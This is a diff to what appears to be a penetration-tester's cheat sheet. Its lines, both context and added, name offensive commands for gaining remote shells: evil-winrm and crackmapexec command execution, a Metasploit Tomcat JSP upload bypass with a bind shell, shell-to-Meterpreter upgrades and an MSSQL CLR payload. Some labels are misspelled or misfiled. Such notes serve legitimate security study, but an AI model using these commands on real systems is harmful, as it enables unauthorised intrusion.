@@ -45,7 +45,7 @@ WINRM -
 scan 5985-6
 crackmapexec winrm ip -u user -p pass // -x "command"
 evil-winrm.rb -u user -p pass -i ip // gets powershell shell 
-wimrm_script // MSF  set FORCE_VBS true
+wimrm_script_exec // MSF  set FORCE_VBS true
 
 SNMP -
 nmap -sU -p 161 --script=snmp-*
@@ -116,6 +116,28 @@ use exploit/windows/http/rejetto_hfs_exec
 
 Drupal -
 drupalgeddon
+
+TOMCAT -
+tomcat_jsp_upload_bypass // MSF
+set payload java_shell_bind_tcp
+set SHELL cmd
+
+PYTHON WEB SERVER -
+sudo python -m SimpleHTTPServer 80
+
+NMAP -
+nmap -Pn -p- -sC -sV (IP) -vvv -oA nmap_full 
+
+WINDOWS -
+dir C:\Windows\System32\*.txt /s /b  //shows all files that end with txt
+
+SHELL UPGRADES -
+use multi/manage/shell_to_meterpreter
+
+MYSQL -
+msssql 2012 is vulnerable to  mssql_clr_payload 
+
+
 
 
 
